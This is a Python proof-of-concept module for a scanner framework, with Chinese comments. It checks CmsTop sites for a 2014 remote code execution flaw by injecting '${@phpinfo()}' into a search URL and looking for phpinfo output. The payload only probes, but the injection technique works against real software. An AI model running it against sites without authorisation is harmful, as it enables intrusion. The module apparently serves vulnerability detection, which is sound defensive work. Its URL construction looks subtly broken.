# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CmsTop_0001'  # 平台漏洞编号，留空
    name = 'CmsTop 远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-03-27'  # 漏洞公布时间
    desc = '''
        CmsTop /domain.com/app/?, /app.domain.com/? 存在远程代码执行漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=054693'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CmsTop'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '90b2af13-dbf4-4541-ae45-7f5a059d8f25'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2014-054693
            # 获取域名
            url = self.target
            domain_name = url.split('www')[-1]
            # print(domain_name)
            payloads = [
                'http://app' + domain_name +
                '/?app=search&controller=index&id=$page&action=search&wd=a&test=${@phpinfo()}',
                self.target +
                '/app/?app=search&controller=index&id=$page&action=search&wd=a&test=${@phpinfo()}'
            ]
            for payload in payloads:
                self.output.info("payload={0}".format(payload))
                verify_url = self.target + payload
                req = requests.get(verify_url)
                content = req.text

                if req.status_code == 200 and 'PHP Version' in content and 'Configure Command' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
